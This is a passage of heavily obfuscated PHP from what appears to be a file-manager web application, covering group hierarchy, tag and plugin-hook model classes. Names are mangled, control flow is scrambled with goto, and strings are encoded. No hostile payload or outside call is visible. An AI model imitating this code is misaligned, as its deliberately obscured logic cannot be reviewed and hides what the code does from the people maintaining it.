$D©¨à©Ôë[33], $D©¨à©Ôë[1644]); $CÍ·œ Ç’© = $this->where(array($D©¨à©Ôë[1725] => array($D©¨à©Ôë[7], $dØ¢óğÔé†)))->select(); goto b ùˆ†ÓŠ; aÃ¦®£‘ç: $EÈéÏ¢’¬³ = $this->parseWhereLike($EÈéÏ¢’¬³); if ($f¦¼„à¯Ñ˜) { $EÈéÏ¢’¬³[$D©¨à©Ôë[1644]] = array($D©¨à©Ôë[7], $f¦¼„à¯Ñ˜); } $dØ¢óğÔé† = Model($D©¨à©Ôë[1734])->where($EÈéÏ¢’¬³)->limit($aóÓÉ¥Ã£‰)->select(); goto a¯ç§Øšø¢; E²¡’Ù”¯×: $D©¨à©Ôë =& $_SERVER[úÎü]; $cØ‹ÅÖ¬åš = strtolower($cØ‹ÅÖ¬åš); $EÈéÏ¢’¬³ = array($D©¨à©Ôë[89] => $ağâæîñÄ“, $D©¨à©Ôë[366] => array($D©¨à©Ôë[373], "\x25{$cØ‹ÅÖ¬åš}\x25")); goto aÃ¦®£‘ç; d‘­³ÄÚá: } protected function _listDataApplyItem($E¨çºÊù¡) { $EÚŒòõİèÚ = array($E¨çºÊù¡); $this->_listDataApply($EÚŒòõİèÚ); return $EÚŒòõİèÚ[0]; } protected function _listDataApply(&$dÅ±õ…ê‹„) { goto e»ù…İØø·; CÕÁ©¿²”¢: $this->_listAppendParent($dÅ±õ…ê‹„); $this->_listAppendSourceRoot($dÅ±õ…ê‹„, $Cæó×µâÅÅ); goto BÆ äòÏ±·; Aá¨–È¢èÆ: $this->_listAppendChildren($dÅ±õ…ê‹„); $this->_listAppendChildrenMember($dÅ±õ…ê‹„); $this->_listAppendMeta($dÅ±õ…ê‹„, $Cæó×µâÅÅ); goto CÕÁ©¿²”¢; e»ù…İØø·: $E‹Æ¿½À×™ =& $_SERVER[úÎü]; if (!$dÅ±õ…ê‹„) { return; } $Cæó×µâÅÅ = array_to_keyvalue($dÅ±õ…ê‹„, $E‹Æ¿½À×™[33], $E‹Æ¿½À×™[1644]); goto Aá¨–È¢èÆ; BÆ äòÏ±·: } private function _listAppendChildren(&$e˜ËÅ¤Ü„Ù) { goto f´Š ¥¾…÷; E´Ç‘ª¦†Ç: $AÌ¯‰ºÛ« = array_to_keyvalue($AÌ¯‰ºÛ«, $a¹‹¶±ÜÀÕ[467]); foreach ($e˜ËÅ¤Ü„Ù as &$Aªğªèù©) { $Aªğªèù©[$a¹‹¶±ÜÀÕ[1735]] = isset($AÌ¯‰ºÛ«[$Aªğªèù©[$a¹‹¶±ÜÀÕ[1644]] . $a¹‹¶±ÜÀÕ[1736]]); } unset($Aªğªèù©); goto a¤¬ØÕ§â³; c‰ËÖ´¿: $eÍÊéŞ¿å = count($e˜ËÅ¤Ü„Ù); $e¹ã†‡¬÷š = $this->tablePrefix . $this->tableName; for ($FØÃí§ÚÀ = 0, $f™àˆ‘â½‡ = 0; $FØÃí§ÚÀ < $eÍÊéŞ¿å; $FØÃí§ÚÀ++) { $f™àˆ‘â½‡++; $C¬ºÛÖİŒ° = $e˜ËÅ¤Ü„Ù[$FØÃí§ÚÀ][$a¹‹¶±ÜÀÕ[1644]]; $fæ‹‚‘·ÆØ .= "\123\105\114\105\103\124\40\x2a\x20\x46\x52\117\x4d\x20\50\x53\105\114\105\x43\x54\40\47{$C¬ºÛÖİŒ°}\x5f\x63\150\x69\154\x64\47\x20\x61\163\40\x68\x61\163\x20\106\x52\117\x4d\40\x60{$e¹ã†‡¬÷š}\140\x20\167\x68\145\162\x65\x20\160\141\162\145\x6e\x74\111\104\x3d{$C¬ºÛÖİŒ°}\40\154\151\x6d\151\x74\40\x31\51\x20\x61\163\40\164\142\x5f{$C¬ºÛÖİŒ°}\40\165\x6e\x69\157\x6e\40\141\x6c\x6c\x20"; if (($f™àˆ‘â½‡ >= 20 || $FØÃí§ÚÀ == $eÍÊéŞ¿å - 1) && $fæ‹‚‘·ÆØ) { $fæ‹‚‘·ÆØ = substr($fæ‹‚‘·ÆØ, 0, -strlen($a¹‹¶±ÜÀÕ[466])); $fé´Şì©Ñ– = $this->query($fæ‹‚‘·ÆØ); $AÌ¯‰ºÛ« = array_merge($AÌ¯‰ºÛ«, $fé´Şì©Ñ–); $f™àˆ‘â½‡ = 0; $fæ‹‚‘·ÆØ = $a¹‹¶±ÜÀÕ[33]; } } goto E´Ç‘ª¦†Ç; f´Š ¥¾…÷: $a¹‹¶±ÜÀÕ =& $_SERVER[úÎü]; $fæ‹‚‘·ÆØ = $a¹‹¶±ÜÀÕ[368]; $AÌ¯‰ºÛ« = array(); goto c‰ËÖ´¿; a¤¬ØÕ§â³: } private function _listAppendChildrenMember(&$f¡§äâ…ª¸) { goto D³˜²¯±; D³˜²¯±: $bê†º—ï„¤ =& $_SERVER[úÎü]; $B«¬ã¼®µ = $bê†º—ï„¤[368]; $a–—Ê¥ß¯Õ = array(); goto e­¸©‹áô; e­¸©‹áô: $a¨³À£ˆå = count($f¡§äâ…ª¸); $CŸÂÙé¨õ¼ = $this->tablePrefix . $bê†º—ï„¤[1727]; for ($bÄÑ®‚Å£µ = 0, $fÊ–†ßÕÁ = 0; $bÄÑ®‚Å£µ < $a¨³À£ˆå; $bÄÑ®‚Å£µ++) { $fÊ–†ßÕÁ++; $c¯öŸîËÂ§ = $f¡§äâ…ª¸[$bÄÑ®‚Å£µ][$bê†º—ï„¤[1644]]; $B«¬ã¼®µ .= "\x53\105\x4c\x45\103\124\40\x2a\x20\106\x52\117\115\x20\x28\x53\105\x4c\x45\103\124\40\x27{$c¯öŸîËÂ§}\x5f\x63\x68\x69\x6c\144\47\x20\141\x73\40\x68\x61\163\40\x46\x52\117\x4d\40\140{$CŸÂÙé¨õ¼}\x60\x20\x77\x68\145\x72\145\40\x67\x72\x6f\165\160\x49\104\75{$c¯öŸîËÂ§}\40\x6c\x69\x6d\x69\x74\x20\x31\x29\40\141\x73\x20\164\142\x5f{$c¯öŸîËÂ§}\x20\x75\156\x69\157\156\x20\141\x6c\x6c\40"; if (($fÊ–†ßÕÁ >= 20 || $bÄÑ®‚Å£µ == $a¨³À£ˆå - 1) && $B«¬ã¼®µ) { $B«¬ã¼®µ = substr($B«¬ã¼®µ, 0, -strlen($bê†º—ï„¤[466])); $b­çÍ„Ã®ä = $this->query($B«¬ã¼®µ); $a–—Ê¥ß¯Õ = array_merge($a–—Ê¥ß¯Õ, $b­çÍ„Ã®ä); $fÊ–†ßÕÁ = 0; $B«¬ã¼®µ = $bê†º—ï„¤[33]; } } goto bº‰ø²•Â‚; bº‰ø²•Â‚: $a–—Ê¥ß¯Õ = array_to_keyvalue($a–—Ê¥ß¯Õ, $bê†º—ï„¤[467]); foreach ($f¡§äâ…ª¸ as &$a™Á£ÅÍº¶) { $a™Á£ÅÍº¶[$bê†º—ï„¤[1737]] = isset($a–—Ê¥ß¯Õ[$a™Á£ÅÍº¶[$bê†º—ï„¤[1644]] . $bê†º—ï„¤[1736]]); } unset($a™Á£ÅÍº¶); goto FİÇÆ¶ÕµÙ; FİÇÆ¶ÕµÙ: } private function _listAppendMeta(&$bÎÇ±îÅ‡, $bãÈï©áé™) { goto CÍßë©İæÙ; aáîšø¼‹º: $f‚‹´„¿âá = array_to_keyvalue_group($f‚‹´„¿âá, $DÇ†¤áÜ…[1644]); foreach ($f‚‹´„¿âá as &$dğÒô¹ÍÃÒ) { $dğÒô¹ÍÃÒ = array_to_keyvalue($dğÒô¹ÍÃÒ, $DÇ†¤áÜ…[89], $DÇ†¤áÜ…[366]); } unset($dğÒô¹ÍÃÒ); goto a†×çèÜ±; a†×çèÜ±: foreach ($bÎÇ±îÅ‡ as &$dŒ£–ˆ£ô) { $dŒ£–ˆ£ô[$DÇ†¤áÜ…[433]] = array(); if (isset($f‚‹´„¿âá[$dŒ£–ˆ£ô[$DÇ†¤áÜ…[1644]]])) { $dŒ£–ˆ£ô[$DÇ†¤áÜ…[433]] = $f‚‹´„¿âá[$dŒ£–ˆ£ô[$DÇ†¤áÜ…[1644]]]; } } unset($dŒ£–ˆ£ô); goto aÔ‹á¶Š„; CÍßë©İæÙ: $DÇ†¤áÜ… =& $_SERVER[úÎü]; $EšìÓÆ‰´¦ = array($DÇ†¤áÜ…[1644] => array($DÇ†¤áÜ…[7], $bãÈï©áé™)); $f‚‹´„¿âá = Model($DÇ†¤áÜ…[1726])->where($EšìÓÆ‰´¦)->select(); goto aáîšø¼‹º; aÔ‹á¶Š„: } protected function parentLevelArray($A³¬çÇ·Îƒ) { $A‘¿‡¹Ã¥× =& $_SERVER[úÎü]; $A³¬çÇ·Îƒ = explode($A‘¿‡¹Ã¥×[47], trim($A³¬çÇ·Îƒ, $A‘¿‡¹Ã¥×[47])); $A³¬çÇ·Îƒ = array_remove_value($A³¬çÇ·Îƒ, $A‘¿‡¹Ã¥×[485]); return $A³¬çÇ·Îƒ; } private function _listAppendParent(&$CßÚÕÀŒî‡) { goto D…Ø‘œ ÷Ù; FÀèİ•ö°ï: unset($BÁ‰‰ªòŒ); $eƒæÆ¿ØÀ¶ = array(); foreach ($A´˜ÚçÓÂ as $d“‰…å¬¥ => $e…ÓÉ•Š¥Ê) { if (!$e…ÓÉ•Š¥Ê) { $eƒæÆ¿ØÀ¶[] = $d“‰…å¬¥; } } goto c¨ÎäÚí°; D…Ø‘œ ÷Ù: $cÆø³¶ó´ =& $_SERVER[úÎü]; $A´˜ÚçÓÂ = array(); foreach ($CßÚÕÀŒî‡ as &$BÁ‰‰ªòŒ) { $A´˜ÚçÓÂ[$BÁ‰‰ªòŒ[$cÆø³¶ó´[1644]]] = $BÁ‰‰ªòŒ[$cÆø³¶ó´[28]]; $F¡³ì„¡×Á = $this->parentLevelArray($BÁ‰‰ªòŒ[$cÆø³¶ó´[476]]); foreach ($F¡³ì„¡×Á as $F¢†•’ÄµÃ) { if (!isset($A´˜ÚçÓÂ[$F¢†•’ÄµÃ])) { $A´˜ÚçÓÂ[$F¢†•’ÄµÃ] = 0; } } } goto FÀèİ•ö°ï; aˆ¬¾›¸¥Ã: unset($BÁ‰‰ªòŒ); goto A¶í¶ŠéÚ; c¨ÎäÚí°: if ($eƒæÆ¿ØÀ¶) { $a÷ŞØ§Ç¿ = array($cÆø³¶ó´[1725] => array($cÆø³¶ó´[400], $eƒæÆ¿ØÀ¶)); $a³øŸµ¦¡ç = $this->field($cÆø³¶ó´[1738])->where($a÷ŞØ§Ç¿)->select(); $b¬ˆí—£’é = array_to_keyvalue($a³øŸµ¦¡ç, $cÆø³¶ó´[1644], $cÆø³¶ó´[28]); $A´˜ÚçÓÂ = array_merge_index($A´˜ÚçÓÂ, $b¬ˆí—£’é); } $f‡òšÆäÛ = $GLOBALS[$cÆø³¶ó´[6]][$cÆø³¶ó´[84]][$cÆø³¶ó´[1739]]; foreach ($CßÚÕÀŒî‡ as &$BÁ‰‰ªòŒ) { $F¡³ì„¡×Á = $this->parentLevelArray($BÁ‰‰ªòŒ[$cÆø³¶ó´[476]]); $eÌÒ‹ÚÇ„è = $cÆø³¶ó´[33]; foreach ($F¡³ì„¡×Á as $d“‰…å¬¥ => $F¢†•’ÄµÃ) { if ($f‡òšÆäÛ && $d“‰…å¬¥ == 0) { continue; } $eÌÒ‹ÚÇ„è .= $A´˜ÚçÓÂ[$F¢†•’ÄµÃ] . $cÆø³¶ó´[8]; } if ($F¡³ì„¡×Á) { $eÌÒ‹ÚÇ„è .= $BÁ‰‰ªòŒ[$cÆø³¶ó´[28]]; } $BÁ‰‰ªòŒ[$cÆø³¶ó´[480]] = str_replace($cÆø³¶ó´[484], $cÆø³¶ó´[8], $eÌÒ‹ÚÇ„è); } goto aˆ¬¾›¸¥Ã; A¶í¶ŠéÚ: } private function _listAppendSourceRoot(&$BöÎ¨Æœ½, $F„®ë©í¹ñ) { goto f”´Úè™ ì; bõæ‡®ÏÉò: foreach ($BöÎ¨Æœ½ as &$bß¤ä¶ˆ¤Ä) { $bß¤ä¶ˆ¤Ä[$EÑ‘Ï¨ì•[407]] = $Bíù‰“å¼á[$bß¤ä¶ˆ¤Ä[$EÑ‘Ï¨ì•[1644]]] ? $Bíù‰“å¼á[$bß¤ä¶ˆ¤Ä[$EÑ‘Ï¨ì•[1644]]] : array(); } unset($bß¤ä¶ˆ¤Ä); goto E¢­³“­®; f”´Úè™ ì: $EÑ‘Ï¨ì• =& $_SERVER[úÎü]; $e·ˆ¿ø©±Õ = array($EÑ‘Ï¨ì•[387] => SourceModel::TYPE_GROUP, $EÑ‘Ï¨ì•[478] => 0, $EÑ‘Ï¨ì•[473] => array($EÑ‘Ï¨ì•[7], $F„®ë©í¹ñ)); $a–§¶—‚Ê = $EÑ‘Ï¨ì•[1740]; goto d‘ÉˆÑä¢Á; d‘ÉˆÑä¢Á: $Bíù‰“å¼á = Model($EÑ‘Ï¨ì•[752])->order($EÑ‘Ï¨ì•[1741])->field($a–§¶—‚Ê)->where($e·ˆ¿ø©±Õ)->select(); $Bíù‰“å¼á = array_to_keyvalue($Bíù‰“å¼á, $EÑ‘Ï¨ì•[473]); $Bíù‰“å¼á = array_remove_key($Bíù‰“å¼á, $EÑ‘Ï¨ì•[473]); goto bõæ‡®ÏÉò; E¢­³“­®: } protected function groupMerge($E¼¿»Ä‰…½) { $E¼¿»Ä‰…½ = array_values(array_unique($E¼¿»Ä‰…½)); $A¶Œ®½‹ƒã = array(); for ($EøÅƒ§‡äÜ = 0; $EøÅƒ§‡äÜ < count($E¼¿»Ä‰…½); $EøÅƒ§‡äÜ++) { $eŸ¦“ÎŠö = !1; for ($FÃÖ‹ÉÂ¬Ë = 0; $FÃÖ‹ÉÂ¬Ë < count($E¼¿»Ä‰…½); $FÃÖ‹ÉÂ¬Ë++) { if ($EøÅƒ§‡äÜ == $FÃÖ‹ÉÂ¬Ë) { continue; } if ($this->isParentOf($E¼¿»Ä‰…½[$FÃÖ‹ÉÂ¬Ë], $E¼¿»Ä‰…½[$EøÅƒ§‡äÜ])) { $eŸ¦“ÎŠö = !0; break; } } if (!$eŸ¦“ÎŠö) { $A¶Œ®½‹ƒã[] = $E¼¿»Ä‰…½[$EøÅƒ§‡äÜ]; } } return $A¶Œ®½‹ƒã; } protected function isParentOf($dÒ‚ÁÊ‰Œ, $Bˆ´—Ù§İó) { goto D¢ÔÉ­øÒ·; CÓ³µ„•ÙÂ: $f³„•µÎÂó = $this->getInfoSimple($Bˆ´—Ù§İó); $dÓ•™ÓÂŞ = $e¾¤ˆÀğ‰Å[$aáÂ¸¨èĞ‡[476]] . $dÒ‚ÁÊ‰Œ . $aáÂ¸¨èĞ‡[47]; if (substr($f³„•µÎÂó[$aáÂ¸¨èĞ‡[476]], 0, strlen($dÓ•™ÓÂŞ)) == $dÓ•™ÓÂŞ) { return !0; } goto CøÏÂš§ˆ; D¢ÔÉ­øÒ·: $aáÂ¸¨èĞ‡ =& $_SERVER[úÎü]; if (!$dÒ‚ÁÊ‰Œ || !$Bˆ´—Ù§İó || $dÒ‚ÁÊ‰Œ == $Bˆ´—Ù§İó) { return !1; } $e¾¤ˆÀğ‰Å = $this->getInfoSimple($dÒ‚ÁÊ‰Œ); goto CÓ³µ„•ÙÂ; CøÏÂš§ˆ: return !1; goto dÔïºí‘®™; dÔïºí‘®™: } public function groupShowRoot($bèÁÆÛ÷«, $fËñæ† Óİ = false) { goto bàŸé†¨ˆ ; bàŸé†¨ˆ : $D×Õ©Œî‘· =& $_SERVER[úÎü]; $c»•ø‹ºâ÷ = $this->getInfo($bèÁÆÛ÷«); if (!$c»•ø‹ºâ÷) { return array(); } goto DÈô„ÌğÉ; eæ·ˆŠç·Ú: return $b·¹®Áèºé; goto F…›‚Ò‹; EÓ´í§¸†î: if ($fËñæ† Óİ && count($Bœ÷§‹„ˆ„) == 1) { return $b·¹®Áèºé; } if (!$c»•ø‹ºâ÷[$D×Õ©Œî‘·[433]] || !isset($c»•ø‹ºâ÷[$D×Õ©Œî‘·[433]][$D×Õ©Œî‘·[1723]]) || $c»•ø‹ºâ÷[$D×Õ©Œî‘·[433]][$D×Õ©Œî‘·[1723]] == $D×Õ©Œî‘·[1696]) { return $this->groupShowRoot($Bœ÷§‹„ˆ„[count($Bœ÷§‹„ˆ„) - 1], $fËñæ† Óİ); } if ($c»•ø‹ºâ÷[$D×Õ©Œî‘·[433]][$D×Õ©Œî‘·[1723]] == $D×Õ©Œî‘·[353]) { $a”’³°ºÕ» = explode($D×Õ©Œî‘·[47], $c»•ø‹ºâ÷[$D×Õ©Œî‘·[433]][$D×Õ©Œî‘·[1724]]); if ($a”’³°ºÕ») { $b·¹®Áèºé = array_merge($b·¹®Áèºé, $a”’³°ºÕ»); } } goto eæ·ˆŠç·Ú; DÈô„ÌğÉ: $Bœ÷§‹„ˆ„ = $this->parentLevelArray($c»•ø‹ºâ÷[$D×Õ©Œî‘·[476]]); $b·¹®Áèºé = array($bèÁÆÛ÷«); if (count($Bœ÷§‹„ˆ„) == 0) { return $b·¹®Áèºé; } goto EÓ´í§¸†î; F…›‚Ò‹: } protected function resetParentLevel() { $fòÛ¡¢èå‹ =& $_SERVER[úÎü]; $FÍíÖØÉÆĞ = $fòÛ¡¢èå‹[1644]; $F£º¡±ìÜÕ = $this->select(); $F£º¡±ìÜÕ = array_to_keyvalue($F£º¡±ìÜÕ, $FÍíÖØÉÆĞ); foreach ($F£º¡±ìÜÕ as $cÔ£íø˜îæ) { goto e¹Ûˆ£œ«„; e¹Ûˆ£œ«„: $dÇ¼È§æ‡ = $cÔ£íø˜îæ; $f£Ø·Û·ˆ· = array(); while ($dÇ¼È§æ‡[$fòÛ¡¢èå‹[478]] != 0) { $f£Ø·Û·ˆ·[] = $dÇ¼È§æ‡[$fòÛ¡¢èå‹[478]]; $dÇ¼È§æ‡ = $F£º¡±ìÜÕ[$dÇ¼È§æ‡[$fòÛ¡¢èå‹[478]]]; } goto Fè·ö½ĞàØ; d­Ö³©Üù¨: $this->where(array($FÍíÖØÉÆĞ => $cÔ£íø˜îæ[$FÍíÖØÉÆĞ]))->save(array($fòÛ¡¢èå‹[542] => $f£Ø·Û·ˆ·)); goto cÅ„¥•ïì; Fè·ö½ĞàØ: $f£Ø·Û·ˆ·[] = 0; $f£Ø·Û·ˆ· = $fòÛ¡¢èå‹[47] . implode($fòÛ¡¢èå‹[47], array_reverse($f£Ø·Û·ˆ·)) . $fòÛ¡¢èå‹[47]; $this->setNamePinyin($cÔ£íø˜îæ[$FÍíÖØÉÆĞ], $cÔ£íø˜îæ[$fòÛ¡¢èå‹[28]]); goto d­Ö³©Üù¨; cÅ„¥•ïì: } return $F£º¡±ìÜÕ; } public function groupNameAuto($D¢Ê¼”®´Ø, $Bàñ¬Ğ¸¶­) { $aèìƒë‚è­ =& $_SERVER[úÎü]; $f„ÅÈøáª¡ = $this->where(array($aèìƒë‚è­[384] => $D¢Ê¼”®´Ø))->getField($aèìƒë‚è­[28], !0); if (!$f„ÅÈøáª¡ || !in_array($Bàñ¬Ğ¸¶­, $f„ÅÈøáª¡)) { return $Bàñ¬Ğ¸¶­; } for ($cõ´Ğ»‹æ° = 1; $cõ´Ğ»‹æ° <= count($f„ÅÈøáª¡) + 1; $cõ´Ğ»‹æ°++) { $B½Ïóšõá = $Bàñ¬Ğ¸¶­ . "\50{$cõ´Ğ»‹æ°}\x29"; if (!in_array($B½Ïóšõá, $f„ÅÈøáª¡)) { return $B½Ïóšõá; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($DÛâé‰­) { $FÁš‹âŒ¶ =& $_SERVER[úÎü]; return array($FÁš‹âŒ¶[1742] => array($DÛâé‰­[0], $FÁš‹âŒ¶[1743]), $FÁš‹âŒ¶[1744] => array($DÛâé‰­[0], $FÁš‹âŒ¶[1745])); } protected function get($B­êó–ô„) { $Bù©ÕñË›¹ =& $_SERVER[úÎü]; $e£Ñ­™¸âË = Model($Bù©ÕñË›¹[475])->metaGet($B­êó–ô„, $Bù©ÕñË›¹[1746]); $E¨Ğ÷Œğ® = json_decode($e£Ñ­™¸âË, !0); return $E¨Ğ÷Œğ® ? $E¨Ğ÷Œğ® : array($Bù©ÕñË›¹[1747] => $Bù©ÕñË›¹[83], $Bù©ÕñË›¹[361] => array()); } protected function set($F‚–½Š± ›, $E¡ÉôêË³) { $d‘¯¦Œ¢Ø =& $_SERVER[úÎü]; $E¡ÉôêË³ = $E¡ÉôêË³ ? $E¡ÉôêË³ : array($d‘¯¦Œ¢Ø[1747] => $d‘¯¦Œ¢Ø[83], $d‘¯¦Œ¢Ø[361] => array()); Model($d‘¯¦Œ¢Ø[475])->metaSet($F‚–½Š± ›, $d‘¯¦Œ¢Ø[1746], json_encode($E¡ÉôêË³)); return Model($d‘¯¦Œ¢Ø[475])->metaSet($F‚–½Š± ›, $d‘¯¦Œ¢Ø[1746], json_encode($E¡ÉôêË³)); } protected function getByTagID($eŞêÏ×å‰, $CĞ‘¦ê±ÂÎ) { goto AÙÜ‚¬Œ…; AÙÜ‚¬Œ…: $CŠè°ÓÕ¥É =& $_SERVER[úÎü]; if (!$eŞêÏ×å‰ || !$CĞ‘¦ê±ÂÎ) { return !1; } if (!Model($CŠè°ÓÕ¥É[475])->getInfoSimple($eŞêÏ×å‰)) { return !1; } goto DÏ†ÃŞà¤; DéŸ¶¼š¸¡: return is_array($A‹±‘¯­ƒƒ) ? $A‹±‘¯­ƒƒ : !1; goto A¤ÔáÙ¡à; DÏ†ÃŞà¤: $f’áÌ°ÊÙ = $this->get($eŞêÏ×å‰); if (!$f’áÌ°ÊÙ || !isset($f’áÌ°ÊÙ[$CŠè°ÓÕ¥É[361]])) { return !1; } $A‹±‘¯­ƒƒ = array_find_by_field($f’áÌ°ÊÙ[$CŠè°ÓÕ¥É[361]], $CŠè°ÓÕ¥É[383], $CĞ‘¦ê±ÂÎ); goto DéŸ¶¼š¸¡; A¤ÔáÙ¡à: } public function listSource($f¸†‚İŠÄ¹, $FîÓ§‹±–«) { goto B»¸¸†Ú˜ˆ; càƒŞÀ†Å: foreach ($aîöã£Ò·  as $e¾È›ôšÔÛ => $DËÛ²—£á) { $cõ½İ°«Ì = !0; if (!$FîÓ§‹±–«) { $E†…ï¢Æ¹[] = $e¾È›ôšÔÛ; continue; } foreach ($FîÓ§‹±–« as $Cö„‚ì¥ŠÅ) { if (!in_array($Cö„‚ì¥ŠÅ, $DËÛ²—£á)) { $cõ½İ°«Ì = !1; break; } } if ($cõ½İ°«Ì) { $E†…ï¢Æ¹[] = $e¾È›ôšÔÛ; } } if (!$E†…ï¢Æ¹) { return array(); } $B®Û¸“„  = Model($BÈËå²Ÿ²[1162])->listSource(array($BÈËå²Ÿ²[399] => array($BÈËå²Ÿ²[400], $E†…ï¢Æ¹))); goto BÎæÀ¡ñ–; B»¸¸†Ú˜ˆ: $BÈËå²Ÿ² =& $_SERVER[úÎü]; if ($FîÓ§‹±–« && !is_array($FîÓ§‹±–«)) { $FîÓ§‹±–« = array($FîÓ§‹±–«); } $Dğ¶ùØ­±£ = $this->listData($f¸†‚İŠÄ¹); goto b‡µ¯ ÜÂë; b‡µ¯ ÜÂë: $aîöã£Ò·  = array(); foreach ($Dğ¶ùØ­±£ as $cçåİù¹•) { $Cè‘˜ÂÜİÃ = $cçåİù¹•[$BÈËå²Ÿ²[75]]; if (!$Cè‘˜ÂÜİÃ) { continue; } if (!isset($aîöã£Ò· [$Cè‘˜ÂÜİÃ])) { $aîöã£Ò· [$Cè‘˜ÂÜİÃ] = array(); } $aîöã£Ò· [$Cè‘˜ÂÜİÃ][] = $cçåİù¹•[$BÈËå²Ÿ²[409]]; } $E†…ï¢Æ¹ = array(); goto càƒŞÀ†Å; A·¿Ò™­ö: if ($C÷õö†£—Š) { $this->removeBySource($f¸†‚İŠÄ¹, $C÷õö†£—Š); } return $B®Û¸“„ ; goto C·ŞŒµ­òâ; BÎæÀ¡ñ–: if (!$B®Û¸“„  || count($E†…ï¢Æ¹) == $B®Û¸“„ [$BÈËå²Ÿ²[358]][$BÈËå²Ÿ²[359]]) { return $B®Û¸“„ ; } $C÷õö†£—Š = array(); $f÷–ÒÃ…¯ˆ = array_to_keyvalue($B®Û¸“„ [$BÈËå²Ÿ²[74]], $BÈËå²Ÿ²[33], $BÈËå²Ÿ²[385]); goto Eò¡ŠˆêÏŒ; Eò¡ŠˆêÏŒ: $E• çÆÔ„ = array_to_keyvalue($B®Û¸“„ [$BÈËå²Ÿ²[73]], $BÈËå²Ÿ²[33], $BÈËå²Ÿ²[385]); $D®×²§Àñé = array_merge($E• çÆÔ„, $f÷–ÒÃ…¯ˆ); foreach ($E†…ï¢Æ¹ as $Cè‘˜ÂÜİÃ) { if (!in_array($Cè‘˜ÂÜİÃ, $D®×²§Àñé)) { $C÷õö†£—Š[] = $Cè‘˜ÂÜİÃ; } } goto A·¿Ò™­ö; C·ŞŒµ­òâ: } protected function listData($D¶ñ¬îœÉì) { $cç®ÕÜ±§ø =& $_SERVER[úÎü]; $F¢ìÀ¥ºµÅ = array($cç®ÕÜ±§ø[1477] => 0, $cç®ÕÜ±§ø[451] => array($cç®ÕÜ±§ø[1748], 0), $cç®ÕÜ±§ø[404] => $cç®ÕÜ±§ø[1749] . $D¶ñ¬îœÉì); $D·»–ÑÈ = $cç®ÕÜ±§ø[1750]; $eˆŒ–Íº«î = $this->field($D·»–ÑÈ)->where($F¢ìÀ¥ºµÅ)->order($cç®ÕÜ±§ø[1751])->select(); return $eˆŒ–Íº«î ? $eˆŒ–Íº«î : array(); } protected function addToTag($DÚ×†ùì¦ì, $D«’ë´¸·ó, $D…ïğ‰ƒÒ) { $a–äø¹Ô• =& $_SERVER[úÎü]; if (!$this->getByTagID($DÚ×†ùì¦ì, $D…ïğ‰ƒÒ) || !$D«’ë´¸·ó) { return !1; } if (!Model($a–äø¹Ô•[752])->pathInfo($D«’ë´¸·ó)) { return !1; } $e“«ø¾Ä¬• = array($a–äø¹Ô•[1477] => 0, $a–äø¹Ô•[451] => $D…ïğ‰ƒÒ, $a–äø¹Ô•[403] => $D«’ë´¸·ó, $a–äø¹Ô•[404] => $a–äø¹Ô•[1752] . $DÚ×†ùì¦ì, $a–äø¹Ô•[402] => $a–äø¹Ô•[33], $a–äø¹Ô•[1648] => 0); if ($this->where($e“«ø¾Ä¬•)->find()) { return !1; } return $this->add($e“«ø¾Ä¬•); } protected function removeFromTag($E—ß‚ôóæ…, $dÅÑÜÔĞé†, $dÓÑÒôÑŒœ) { $FğÇØùøâ =& $_SERVER[úÎü]; if (!$this->getByTagID($E—ß‚ôóæ…, $dÓÑÒôÑŒœ) || !$dÅÑÜÔĞé†) { return !1; } if (is_array($dÅÑÜÔĞé†)) { $dÅÑÜÔĞé† = array($FğÇØùøâ[7], $dÅÑÜÔĞé†); } $E«£¤ÇÎÓ = array($FğÇØùøâ[1477] => 0, $FğÇØùøâ[451] => $dÓÑÒôÑŒœ, $FğÇØùøâ[404] => $FğÇØùøâ[1752] . $E—ß‚ôóæ…, $FğÇØùøâ[403] => $dÅÑÜÔĞé†); return $this->where($E«£¤ÇÎÓ)->delete(); } protected function removeByTag($DÖÓ¥â¼ãÂ, $DñŸÕÉ‡“) { $f§Èãíª¡Ò =& $_SERVER[úÎü]; if (!$this->getByTagID($DÖÓ¥â¼ãÂ, $DñŸÕÉ‡“)) { return !1; } $c´ÑùŸÀÑ¯ = array($f§Èãíª¡Ò[1477] => 0, $f§Èãíª¡Ò[451] => $DñŸÕÉ‡“, $f§Èãíª¡Ò[404] => $f§Èãíª¡Ò[1752] . $DÖÓ¥â¼ãÂ); return $this->where($c´ÑùŸÀÑ¯)->delete(); } protected function removeBySource($d÷Öİß¬·é, $d£Òì»É”¥) { $f˜•†Ù‚ìË =& $_SERVER[úÎü]; if (!$d÷Öİß¬·é || !$d£Òì»É”¥) { return !1; } if (is_array($d£Òì»É”¥)) { $d£Òì»É”¥ = array($f˜•†Ù‚ìË[7], $d£Òì»É”¥); } $a¬ÄÒøÄ„ = array($f˜•†Ù‚ìË[1477] => 0, $f˜•†Ù‚ìË[403] => $d£Òì»É”¥, $f˜•†Ù‚ìË[451] => array($f˜•†Ù‚ìË[932], 0), $f˜•†Ù‚ìË[404] => $f˜•†Ù‚ìË[1752] . $d÷Öİß¬·é); return $this->where($a¬ÄÒøÄ„)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\160\x6c\x75\147\x69\156\114\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\x73\164\x61\164\x75\163", "\x72\x65\147\x69\145\x73\x74", "\143\157\x6e\146\151\147"); public function loadList($CÜ°Æ©Û¿† = false) { $bìĞ¬¿› = array_to_keyvalue($this->listData(), $_SERVER[úÎü][28]); if ($CÜ°Æ©Û¿†) { return $bìĞ¬¿›[$CÜ°Æ©Û¿†]; } return $bìĞ¬¿›; } public function init() { $Cİ÷Ÿ¨ñ’á =& $_SERVER[úÎü]; Hook::trigger($Cİ÷Ÿ¨ñ’á[1753]); $F†ò’¸»° = $this->loadPluginList(); foreach ($F†ò’¸»° as $ağ‚Óøò… => $BŞç£”Œ‡â) { $bÌ±¶èĞ´´ = $this->appAllow($ağ‚Óøò…, $BŞç£”Œ‡â); if (!$bÌ±¶èĞ´´) { continue; } foreach ($BŞç£”Œ‡â[$Cİ÷Ÿ¨ñ’á[1754]] as $A²§«§½‚™ => $cÕ‘×«‰³) { Hook::bind($A²§«§½‚™, $cÕ‘×«‰³); } } Hook::trigger($Cİ÷Ÿ¨ñ’á[1755]); Hook::trigger(ACTION); } public function appAllow($E¶æèìÛŸ, $D§È‚í¨, $aˆÀ¢¦²†õ = true) { $B¬åÚ¹©Ğä =& 